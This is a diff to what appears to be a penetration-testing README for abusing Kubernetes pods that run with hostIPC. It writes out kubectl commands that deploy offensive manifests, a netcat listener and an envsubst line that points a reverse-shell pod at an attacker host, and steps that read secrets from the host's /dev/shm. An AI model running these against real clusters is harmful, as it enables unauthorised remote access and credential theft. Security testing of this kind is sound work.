@@ -4,39 +4,72 @@ If you only have `hostIPC=true`, you most likely can't do much. If any process o
 
 * **Inspect /dev/shm** - Look for any files in this shared memory location. 
 * **Inspect existing IPC facilities** – You can check to see if any IPC facilities are being used with `/usr/bin/ipcs`. 
-# Pod Creation
-## Create a pod you can exec into
-Create pod
+
+# Pod creation & access
+
+## Exec pods
+Create one or more of these resource types and exec into the pod
+
+**Pod**  
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostipc/pod/hostipc-exec-pod.yaml 
-```
-Exec into pod 
-```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostipc/pod/hostipc-exec-pod.yaml
 kubectl exec -it hostipc-exec-pod -- bash
 ```
+**Job, CronJob, Deployment, StatefulSet, ReplicaSet, ReplicationController, DaemonSet**
 
-## Reverse shell pod
+* Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
 
-Set up listener
+```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostipc/[RESOURCE_TYPE]/hostipc-exec-[RESOURCE_TYPE].yaml 
+kubectl get pods | grep hostipc-exec-[RESOURCE_TYPE]      
+kubectl exec -it hostipc-exec-[RESOURCE_TYPE]-[ID] -- bash
+```
+
+*Keep in mind that if pod security policy blocks the pod, the resource type will still get created. The admission controller only blocks the pods that are created by the resource type.* 
+
+To troubleshoot a case where you don't see pods, use `kubectl describe`
+
+```
+kubectl describe priv-exec-[RESOURCE_TYPE]
+```
+
+## Reverse shell pods
+Create one or more of these resources and catch the reverse shell
+
+**Step 1: Set up listener**
 ```bash
 nc -nvlp 3116
 ```
 
-Create pod from local manifest without modifying it by using env variables and envsubst
+**Step 2: Create pod from local manifest without modifying it by using env variables and envsubst**
+
+* Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
+* Replace the HOST and PORT values to point the reverse shell to your listener
+* 
 ```bash
-HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/pod/hostipc/pod/hostipc-revshell-pod.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/hostipc/[RESOURCE_TYPE]/hostipc-revshell-[RESOURCE_TYPE].yaml | kubectl apply -f -
 ```
 
-Catch the shell
+**Step 3: Catch the shell**
 ```bash
 $ nc -nvlp 3116
 Listening on 0.0.0.0 3116
 Connection received on 10.0.0.162 42035
 ```
 
+## Deleting resources
+You can delete a resource using it's manifest, or by name. Here are some examples: 
+```
+kubectl delete [type] [resource-name]
+kubectl delete -f manifests/hostipc/pod/hostipc-exec-pod.yaml
+kubectl delete -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostipc/pod/hostipc-exec-pod.yaml
+kubectl delete pod hostipc-exec-pod
+kubectl delete cronjob hostipc-exec-cronjob
+```
+
 # Post exploitation 
 
-#### Inspect /dev/shm - Look for any files in this shared memory location.
+## Inspect /dev/shm - Look for any files in this shared memory location.
 
 For a super simple POC, I have created a secret file in /dev/shm on the worker node"
 ```
@@ -44,7 +77,7 @@ root@k8s-worker:/# echo "secretpassword=BishopFox" > /dev/shm/secretpassword.txt
 ```
 
 
-List all files in /dev/shm
+From the hostIPC pod, we can list all files in /dev/shm
 ```
 root@hostipc-exec-pod:/# ls -al /dev/shm/
 total 4
@@ -60,7 +93,7 @@ root@hostipc-exec-pod:/# cat /dev/shm/secretpassword.txt
 secretpassword=BishopFox
 ```
 
-#### Look for any use of inter-process communication on the host 
+## Look for any use of inter-process communication on the host 
 ```bash
 ipcs -a
 ```
@@ -74,5 +107,6 @@ ipcs -a
 # Demonstrate Impact
 If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the penetration test.
 
-# Reference(s): 
+# References and further reading: 
+* https://docs.docker.com/engine/reference/run/#ipc-settings---ipc
 * https://opensource.com/article/20/1/inter-process-communication-linux
